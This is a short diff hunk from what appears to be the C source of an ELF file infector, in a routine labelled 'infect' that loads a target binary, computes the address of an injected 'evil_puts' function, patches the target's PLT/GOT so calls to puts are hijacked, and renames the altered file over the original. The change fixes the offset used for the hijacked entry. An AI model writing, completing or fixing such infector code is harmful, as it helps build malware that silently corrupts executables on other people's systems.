@@ -753,9 +753,8 @@ infect:
 			load_target_writeable(TMP, &target);
 			base_addr = PIC_RESOLVE_ADDR(&_start);
 			evilputs_addr = PIC_RESOLVE_ADDR(&evil_puts);
-			base_addr &= ~4095;
 			evilputs_offset = evilputs_addr - base_addr;
-			infect_pltgot(&target, new_base + (evilputs_offset - 256));
+			infect_pltgot(&target, new_base + evilputs_offset + sizeof(Elf64_Ehdr));
 			unload_target(&target);
 #endif
 			_rename(TMP, fpath);
